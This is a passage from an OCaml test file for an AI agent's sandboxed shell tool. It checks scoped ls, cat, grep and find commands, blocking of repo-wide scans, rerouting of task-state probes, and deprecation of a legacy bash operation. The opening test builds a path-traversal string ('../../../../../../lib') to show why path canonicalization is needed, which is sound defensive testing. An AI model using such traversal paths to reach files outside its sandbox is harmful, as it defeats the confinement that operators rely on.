  let raw_traversal = pg ^ "/repos/masc-mcp/../../../../../../lib" in
  let would_match_raw = String.starts_with ~prefix:(pg ^ "/") raw_traversal in
  Alcotest.(check bool) "raw traversal WOULD match prefix (proves canonicalization needed)"
    true would_match_raw

(* ── keeper_shell readonly hints teach the model about alternatives ───── *)

let make_readonly_meta name =
  let json =
    `Assoc
      [
        ("name", `String name);
        ("agent_name", `String ("agent-" ^ name));
        ("trace_id", `String ("trace-" ^ name));
        ("goal", `String "readonly hint test");
      ]
  in
  match Masc_test_deps.meta_of_json_fixture json with
  | Ok meta -> meta
  | Error err -> Alcotest.fail ("make_readonly_meta failed: " ^ err)

let make_write_enabled_meta name =
  let json =
    `Assoc
      [
        ("name", `String name);
        ("agent_name", `String ("agent-" ^ name));
        ("trace_id", `String ("trace-" ^ name));
        ("goal", `String "safe fallback write-enabled test");
        ( "tool_access",
          Keeper_types.tool_access_to_json
            (Keeper_types.Preset
               { preset = Keeper_types.Coding; also_allow = [] }) );
      ]
  in
  match Masc_test_deps.meta_of_json_fixture json with
  | Ok meta -> meta
  | Error err -> Alcotest.fail ("make_write_enabled_meta failed: " ^ err)

let parse_hint raw =
  Yojson.Safe.from_string raw
  |> Json.member "hint"
  |> Json.to_string_option

let parse_alternatives raw =
  match Yojson.Safe.from_string raw |> Json.member "alternatives" with
  | `List xs -> List.filter_map Json.to_string_option xs
  | _ -> []

let parse_error_field raw =
  Yojson.Safe.from_string raw
  |> Json.member "error"
  |> Json.to_string_option

let test_keeper_bash_typed_exec_runs_via_shell_ir () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "typed-exec" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "printf"
           ; "argv", `List [ `String "typed-ok" ]
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "typed exec succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "typed flag" true
    (json |> Json.member "typed" |> Json.to_bool);
  Alcotest.(check bool) "output from native argv" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "typed-ok")

let test_keeper_bash_typed_pipeline_runs_via_shell_ir () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "typed-pipeline" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ ( "pipeline"
             , `List
                 [ `Assoc
                     [ "executable", `String "printf"
                     ; "argv", `List [ `String "typed" ]
                     ]
                 ; `Assoc
                     [ "executable", `String "wc"
                     ; "argv", `List [ `String "-c" ]
                     ]
                 ] )
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "typed pipeline succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "typed flag" true
    (json |> Json.member "typed" |> Json.to_bool);
  Alcotest.(check bool) "wc sees piped stdin" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "5")

let test_keeper_bash_typed_docker_requires_factory () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "typed-docker" in
  let playground = Keeper_sandbox.host_root_abs_of_meta ~config meta in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "printf"
           ; "argv", `List [ `String "typed-docker" ]
           ; "cwd", `String playground
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
    if not (String_util.contains_substring err "turn sandbox factory")
    then Alcotest.fail ("unexpected typed docker error: " ^ err)
  | None -> Alcotest.fail ("expected typed docker factory error, got: " ^ raw)

let test_keeper_bash_safe_dev_null_echo_fallback_executes_primary () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "fallback-ls" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let worktrees = Filename.concat playground "repos/masc-mcp/.worktrees" in
  ensure_dir worktrees;
  ignore (Fs_compat.save_file_atomic (Filename.concat worktrees "marker") "ok");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "ls repos/masc-mcp/.worktrees/ 2>/dev/null || echo \"no worktrees\""
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "fallback command succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "primary command ran" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "marker")

let test_keeper_bash_safe_dev_null_redirect_executes_scoped_ls () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "dev-null-ls" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let worktrees = Filename.concat playground "repos/masc-mcp/.worktrees" in
  ensure_dir worktrees;
  ignore (Fs_compat.save_file_atomic (Filename.concat worktrees "marker") "ok");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String "ls repos/masc-mcp/.worktrees/ 2>/dev/null" )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "direct dev-null ls succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "ls output is preserved" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "marker")

let test_keeper_bash_safe_fallback_works_for_write_enabled_keeper () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_write_enabled_meta "fallback-coding" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let worktree = Filename.concat playground "repos/masc-mcp/.worktrees/task-362" in
  ensure_dir worktree;
  ignore (Fs_compat.save_file_atomic (Filename.concat worktree "status.json") "{}");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "cat repos/masc-mcp/.worktrees/task-362/status.json 2>/dev/null || echo \"NOT_FOUND\""
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "write-enabled fallback command succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "primary cat ran" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "{}")

let test_keeper_bash_safe_cd_fallback_executes_scoped_read () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "fallback-cd" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let lib_dir = Filename.concat playground "repos/masc-mcp/lib" in
  ensure_dir lib_dir;
  ignore (Fs_compat.save_file_atomic (Filename.concat lib_dir "marker.ml") "let x = 1");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ "cmd", `String "cd repos/masc-mcp && ls lib"
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "cd fallback command succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "read command ran after cd" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "marker.ml")

let test_keeper_bash_single_repo_root_recovers_top_level_find () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "single-repo-find" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let repo_root = Filename.concat playground "repos/masc-mcp" in
  let lib_dir = Filename.concat repo_root "lib" in
  ensure_dir (Filename.concat repo_root ".git");
  ensure_dir lib_dir;
  ignore (Fs_compat.save_file_atomic (Filename.concat lib_dir "marker.ml") "let x = 1");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [ "cmd", `String "find lib/ -name marker.ml" ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "sandbox-root find succeeds from the single repo" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check string) "execution cwd is the single repo root"
    (Unix.realpath repo_root)
    (json |> Json.member "cwd" |> Json.to_string |> Unix.realpath);
  Alcotest.(check bool) "find output includes repo-local file" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "marker.ml")

let test_keeper_bash_blocks_doubled_repo_prefix_with_public_alias_plan () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "double-prefix-bash" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let repo_root = Filename.concat playground "repos/masc-mcp" in
  ensure_dir (Filename.concat repo_root ".worktrees");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
          [
            ("cmd", `String "ls repos/masc-mcp/.worktrees/");
            ("cwd", `String repo_root);
          ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  let recovery_plan = Json.member "recovery_plan" json in
  let next_args = Json.member "next_args" recovery_plan in
  Alcotest.(check bool) "double-prefix is blocked before exec" false
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check (option string))
    "double-prefix error"
    (Some "keeper_bash_cwd_path_prefix_duplicated")
    (parse_error_field raw);
  Alcotest.(check string) "required next tool uses public alias" "Bash"
    (Json.member "required_next_tool" json |> Json.to_string);
  Alcotest.(check string) "rewritten command removes duplicated repo prefix"
    "ls .worktrees"
    (Json.member "command" next_args |> Json.to_string);
  Alcotest.(check string) "rewritten cwd remains repo-relative"
    "repos/masc-mcp"
    (Json.member "cwd" next_args |> Json.to_string)

let test_keeper_bash_safe_rg_fallback_allows_escaped_regex_pipe () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "fallback-rg" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir (Filename.concat playground "lib");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "rg -n \"ghost\\|task-321\\|task-323\\|task-324\" lib/ --type ml -l 2>/dev/null || echo \"no matches\""
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "rg fallback command succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "fallback echo ran on no match" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "no matches")

let test_keeper_bash_safe_dev_null_redirect_executes_scoped_grep () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "dev-null-grep" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let lib_dir = Filename.concat playground "repos/masc-mcp/lib" in
  ensure_dir lib_dir;
  ignore
    (Fs_compat.save_file_atomic
       (Filename.concat lib_dir "quoted_pipe.ml")
       "let quoted_pipe = true\n");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "grep -Erl \"quoted.pipe|quoted_pipe|shell.*pipe|pipe.*valid\" repos/masc-mcp/lib/ 2>/dev/null"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "direct dev-null grep succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "grep found scoped file" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "quoted_pipe.ml")

let test_keeper_bash_safe_head_pipeline_executes_scoped_cat () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "head-cat" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let repo_dir = Filename.concat playground "repos/masc-mcp/docs" in
  ensure_dir repo_dir;
  ignore
    (Fs_compat.save_file_atomic
       (Filename.concat repo_dir "notes.txt")
       "first line\nsecond line\n");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "cat repos/masc-mcp/docs/notes.txt 2>/dev/null | head -1"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "safe cat | head succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "cat output is preserved" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "first line")

let test_keeper_bash_cat_dev_null_executes () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "dev-null-cat" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ "cmd", `String "cat /dev/null"
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "cat /dev/null succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check string) "cat /dev/null output" ""
    (json |> Json.member "output" |> Json.to_string)

let test_keeper_bash_task_state_file_probe_uses_task_tools () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "task-file-probe" in
  let _ = Coord.init config ~agent_name:(Some meta.name) in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String "cat repos/masc-mcp/.worktrees/task-362/.task.json"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "task file probe succeeds via autoroute" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "task file probe is autorouted" true
    (json |> Json.member "auto_routed" |> Json.to_bool);
  Alcotest.(check string) "autorouted to tasks list"
    "keeper_tasks_list"
    (json |> Json.member "auto_routed_to_tool" |> Json.to_string);
  Alcotest.(check string) "original error preserved"
    "task_state_file_probe_blocked"
    (json |> Json.member "original_error" |> Json.to_string);
  Alcotest.(check bool) "instruction points to keeper_tasks_list" true
    (String_util.contains_substring
       (json |> Json.member "instruction" |> Json.to_string)
       "keeper_tasks_list");
  Alcotest.(check (option string)) "not returned as bash error" None
    (parse_error_field raw)

let test_keeper_bash_unrelated_task_json_is_not_task_state_probe () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "repo-task-json" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let src_dir = Filename.concat playground "src" in
  ensure_dir src_dir;
  let oc = open_out (Filename.concat src_dir ".task.json") in
  Fun.protect
    ~finally:(fun () -> close_out_noerr oc)
    (fun () -> output_string oc "{\"local\":true}\n");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ("cmd", `String "cat src/.task.json")
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "unrelated .task.json read succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check (option string)) "not treated as task-state probe" None
    (parse_error_field raw)

let test_keeper_bash_unrelated_current_task_json_is_not_task_state_probe () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "repo-current-task-json" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let src_dir = Filename.concat playground "src" in
  ensure_dir src_dir;
  let oc = open_out (Filename.concat src_dir "current_task.json") in
  Fun.protect
    ~finally:(fun () -> close_out_noerr oc)
    (fun () -> output_string oc "{\"local\":true}\n");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ("cmd", `String "cat src/current_task.json")
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "unrelated current_task.json read succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check (option string)) "not treated as task-state probe" None
    (parse_error_field raw)

let test_keeper_bash_safe_fallback_does_not_unblock_repo_scan () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "fallback-repo-scan" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir (Filename.concat playground "repos");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "find repos/ -maxdepth 3 -name .worktrees 2>/dev/null || echo none"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check (option string)) "repo scan remains blocked"
    (Some "keeper_bash_command_shape_blocked") (parse_error_field raw);
  Alcotest.(check string) "shape block"
    "repo_wide_scan"
    (json |> Json.member "shape_block" |> Json.to_string)

let test_keeper_bash_task_state_http_probe_uses_task_tools () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_write_enabled_meta "task-http-probe" in
  let _ = Coord.init config ~agent_name:(Some meta.name) in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "curl -s http://localhost:8080/api/tasks?status=awaiting_verification"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "localhost task probe succeeds via autoroute" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "localhost task probe is autorouted" true
    (json |> Json.member "auto_routed" |> Json.to_bool);
  Alcotest.(check string) "autorouted to tasks list"
    "keeper_tasks_list"
    (json |> Json.member "auto_routed_to_tool" |> Json.to_string);
  Alcotest.(check string) "original error preserved"
    "task_state_http_probe_blocked"
    (json |> Json.member "original_error" |> Json.to_string);
  Alcotest.(check bool) "instruction points to keeper_tasks_list" true
    (String_util.contains_substring
       (json |> Json.member "instruction" |> Json.to_string)
       "keeper_tasks_list");
  Alcotest.(check (option string)) "not returned as bash error" None
    (parse_error_field raw)

let test_keeper_bash_echo_task_api_url_is_not_http_probe () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "task-api-echo" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "echo http://localhost:8080/api/tasks?status=awaiting_verification"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "echo containing task API URL succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check (option string)) "not treated as task HTTP probe" None
    (parse_error_field raw)

let test_keeper_bash_safe_head_pipeline_executes_cd_scoped_grep () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "search-pipeline" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let lib_dir = Filename.concat playground "repos/masc-mcp/lib" in
  ensure_dir lib_dir;
  ignore
    (Fs_compat.save_file_atomic
       (Filename.concat lib_dir "exec_semantic.ml")
       "let exec_semantic_marker = true\n");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "cd repos/masc-mcp && grep -rn \"exec_semantic\" lib/ --include=\"*.ml\" | head -40"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "safe grep | head succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "grep output is preserved" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "exec_semantic_marker")

let test_keeper_bash_safe_head_pipeline_executes_scoped_find () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "find-pipeline" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let worktree =
    Filename.concat playground
      "repos/masc-mcp/.worktrees/keeper-umberto-agent-task-343"
  in
  ensure_dir worktree;
  ignore
    (Fs_compat.save_file_atomic
       (Filename.concat worktree "needle.ml")
       "let needle = true\n");
  ignore
    (Fs_compat.save_file_atomic
       (Filename.concat worktree "needle.mli")
       "val needle : bool\n");
  let raw =
    Keeper_exec_shell.handle_keeper_bash
      ~turn_sandbox_factory:None
      ~turn_sandbox_factory_git:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [ ( "cmd"
             , `String
                 "find repos/masc-mcp/.worktrees/keeper-umberto-agent-task-343 -name \"*.ml\" -o -name \"*.mli\" | head -30"
             )
           ; ("cwd", `String playground)
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "safe find | head succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  let output = json |> Json.member "output" |> Json.to_string in
  Alcotest.(check bool) "find output includes ml file" true
    (String_util.contains_substring output "needle.ml");
  Alcotest.(check bool) "find output includes mli file" true
    (String_util.contains_substring output "needle.mli")

let test_keeper_shell_find_accepts_name_alias () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "find-name-alias" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let lib_dir = Filename.concat playground "lib" in
  ensure_dir lib_dir;
  ignore (Fs_compat.save_file_atomic (Filename.concat lib_dir "demo.ml") "let x = 1\n");
  let raw =
    Keeper_exec_shell.handle_keeper_shell
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [
             ("op", `String "find");
             ("path", `String "lib");
             ("name", `String "*.ml");
             ("limit", `Int 5);
           ])
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "name alias succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check string) "alias populates name field" "*.ml"
    (json |> Json.member "name" |> Json.to_string)

let test_keeper_shell_ls_recovers_doubled_playground_prefix () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "masc-improver" in
  let playground =
    Filename.concat base_path (playground_path_of meta.name)
  in
  let repos = Filename.concat playground "repos" in
  ensure_dir repos;
  ignore (Fs_compat.save_file_atomic (Filename.concat repos "demo.txt") "ok");
  let doubled_path =
    Filename.concat playground ((playground_path_of meta.name) ^ "repos")
  in
  let raw =
    Keeper_exec_shell.handle_keeper_shell
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [
        ("op", `String "ls");
        ("path", `String doubled_path);
      ])
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "ls succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check string) "path normalized to repos root" repos
    (json |> Json.member "path" |> Json.to_string)

let test_keeper_shell_bash_op_is_deprecated () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "bash-deprecated" in
  let raw =
    Keeper_exec_shell.handle_keeper_shell
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [
        ("op", `String "bash");
        ("command", `String "git status && git log --oneline -5");
      ])
  in
  Alcotest.(check (option string)) "error is deprecation"
    (Some "keeper_shell_bash_deprecated") (parse_error_field raw);
  (match parse_hint raw with
   | None -> Alcotest.fail ("expected hint field, got: " ^ raw)
   | Some hint ->
     Alcotest.(check bool) "hint points to Bash alias" true
       (String_util.contains_substring hint "Bash");
     Alcotest.(check bool) "hint avoids internal keeper_bash" false
       (String_util.contains_substring hint "keeper_bash");
     Alcotest.(check bool) "hint avoids internal keeper_shell" false
       (String_util.contains_substring hint "keeper_shell"))

let test_keeper_shell_bash_op_does_not_execute () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "bash-no-exec" in
  let playground =
    Filename.concat base_path (playground_path_of meta.name)
  in
  ensure_dir playground;
  let marker = Filename.concat playground "should-not-exist" in
  let raw =
    Keeper_exec_shell.handle_keeper_shell
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [
        ("op", `String "bash");
        ("command", `String "touch should-not-exist");
      ])
  in
  Alcotest.(check (option string)) "error is deprecation"
    (Some "keeper_shell_bash_deprecated") (parse_error_field raw);
  Alcotest.(check bool) "legacy bash op did not execute" false
    (Sys.file_exists marker)

let test_git_write_classification () =
  let is_branch_switch = Masc_mcp.Worker_dev_tools.is_git_branch_switch in
